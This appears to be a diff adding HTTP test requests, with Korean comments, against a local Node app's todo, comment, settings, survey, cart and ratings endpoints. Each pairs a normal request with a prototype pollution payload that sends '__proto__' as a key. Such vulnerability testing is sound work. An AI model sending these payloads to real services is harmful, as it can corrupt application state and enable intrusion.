@@ -1,3 +1,88 @@
+###1
+### 정상 TODO 등록
+PUT http://localhost:3000/todos/user1?name=task1&text=Buy%20milk
+
+### 프로토타입 오염 시도 (취약점 테스트)
+PUT http://localhost:3000/todos/user1?name=__proto__&text=polluted
+
+### 특정 유저 TODO 조회
+GET http://localhost:3000/todos/user1
+
+###2
+### 정상 댓글 등록
+POST http://localhost:3000/comment/post1
+Content-Type: application/json
+
+{
+  "username": "alice",
+  "text": "Hello world!"
+}
+
+### 프로토타입 오염 시도
+POST http://localhost:3000/comment/post1
+Content-Type: application/json
+
+{
+  "username": "__proto__",
+  "text": "polluted"
+}
+
+### 댓글 조회
+GET http://localhost:3000/comment/post1
+
+###3
+### 정상 설정 저장
+POST http://localhost:3000/settings/user123
+Content-Type: application/json
+
+{
+  "settingKey": "theme",
+  "settingValue": "dark"
+}
+
+### 프로토타입 오염 시도
+POST http://localhost:3000/settings/user123
+Content-Type: application/json
+
+{
+  "settingKey": "__proto__",
+  "settingValue": "polluted"
+}
+
+### 설정 조회
+GET http://localhost:3000/settings/user123
+
+###4
+### 설문 답변 저장 (POST)
+POST http://localhost:3000/survey/survey123
+Content-Type: application/json
+
+{
+  "userId": "__proto__",
+  "answers": {
+    "q1": "Yes",
+    "q2": "No"
+  }
+}
+
+### 설문 결과 조회 (GET)
+GET http://localhost:3000/survey/survey123
+
+###5
+### 장바구니 아이템 추가 (POST)
+POST http://localhost:3000/cart/session123
+Content-Type: application/json
+
+{
+  "itemId": "__proto__",
+  "quantity": 5
+}
+
+### 장바구니 조회 (GET)
+GET http://localhost:3000/cart/session123
+
+
+
 ###vul7
 POST http://localhost:3000/ratings/__proto__
 Content-Type: application/json
